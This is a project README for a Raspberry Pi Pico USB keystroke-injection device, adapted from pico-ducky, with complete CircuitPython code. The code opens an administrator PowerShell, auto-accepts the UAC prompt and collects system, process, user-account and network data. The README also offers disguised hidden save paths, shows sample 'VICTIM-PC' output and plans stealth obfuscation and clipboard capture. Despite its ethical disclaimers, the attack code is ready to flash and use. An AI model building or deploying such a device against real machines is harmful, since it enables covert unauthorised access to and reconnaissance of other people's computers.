# 🛠️ Project: Offline USB Rubber Ducky with Raspberry Pi Pico

## Overview

This project aims to create an **offline USB Rubber Ducky** using a Raspberry Pi Pico. When connected to a computer, the device emulates a keyboard and automatically collects essential system information, saving it locally for later analysis—no internet connection required.

> **Disclaimer:** This project is intended for educational purposes and controlled, ethical hacking environments only. Do not deploy on systems without explicit authorization.
## Credits

This project is based on [pico-ducky](https://github.com/dbisu/pico-ducky) created by [dbisu](https://github.com/dbisu).
Special thanks to all contributors of the original pico-ducky project.

---

## What is a USB Rubber Ducky?

A [USB Rubber Ducky](https://hak5.org/products/usb-rubber-ducky) is a device that mimics a USB keyboard, allowing it to inject keystrokes and execute commands automatically when plugged into a target machine. It's widely used by penetration testers and security professionals to demonstrate the risks of physical access attacks.

---

## Features

- **Hardware:** Raspberry Pi Pico microcontroller
- **Firmware:** CircuitPython
- **Libraries:** [Adafruit CircuitPython HID](https://github.com/adafruit/Adafruit_CircuitPython_HID)
- **Payload:** PowerShell script for information gathering
- **Base Project:** Forked and adapted from [`pico-ducky`](https://github.com/dbisu/pico-ducky) by [dbisu](https://github.com/dbisu)

---

## How It Works

Upon connection to a Windows PC:

1. The Pico emulates a USB keyboard (HID).
2. Opens PowerShell with administrator privileges.
3. Executes several commands to gather:
    - System information (`Get-ComputerInfo`)
    - Active processes (`Get-Process`)
    - Local user accounts (`Get-LocalUser`)
    - Network connections (`Get-NetTCPConnection`)
4. Saves the collected data as `audit.txt` on the Desktop (or alternative hidden locations).

**Alternative Storage Paths:**
```powershell
$out = "$env:APPDATA\Microsoft\Windows\Recent\syscache.txt"
# or
$out = "C:\ProgramData\sysinfo.log"
```

---

## CircuitPython Example Code

```python
import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

time.sleep(3)  # Wait for the host to be ready

# Open Run dialog
keyboard.press(Keycode.GUI, Keycode.R)
keyboard.release_all()
time.sleep(0.5)

# Launch PowerShell
layout.write("powershell\n")
time.sleep(1)

# Request admin privileges
keyboard.press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
keyboard.release_all()
time.sleep(1.2)

# Accept UAC prompt (may require language/layout adjustment)
keyboard.press(Keycode.ALT, Keycode.Y)
keyboard.release_all()
time.sleep(0.8)

# PowerShell payload
payload = (
    '$out = "$env:USERPROFILE\\Desktop\\audit.txt"; '
    'Get-ComputerInfo | Out-File $out; '
    'Get-Process | Out-File $out -Append; '
    'Get-LocalUser | Out-File $out -Append; '
    'Get-NetTCPConnection | Out-File $out -Append'
)

layout.write(payload + '\n')
time.sleep(1)
layout.write("exit\n")
```

---

## Sample Output

```
ComputerName           : VICTIM-PC
OSName                 : Microsoft Windows 10 Pro
SystemType             : x64-based PC
Username               : VICTIM\user
...
--- Process List ---
Name                  ID          CPU
------------------   ----------  ----
explorer.exe         1234        3.2
chrome.exe           4567        7.8

--- Users ---
Name                 Enabled
------------------   -------
Admin                True
Guest                False
```

---

## Ethical Considerations

This project demonstrates the importance of physical security and awareness of USB-based attacks. Use responsibly for:

- Security awareness training
- Penetration testing (with permission)
- Cybersecurity labs and demonstrations

> **Warning:** Unauthorized use of this tool is illegal and unethical. Always obtain explicit permission before testing any system.

---

## Roadmap

- Support for multiple, selectable payloads (via physical button)
- Screenshot and clipboard capture functionalities
- Command obfuscation for stealthier payloads
- Automatic system language detection (keyboard layout adaptation)

---

## Conclusion

This project showcases how affordable microcontrollers like the Raspberry Pi Pico can automate complex, real-world security assessments. Properly used, it’s a powerful tool for learning, teaching, and raising awareness about the dangers of physical access and USB attacks.

---
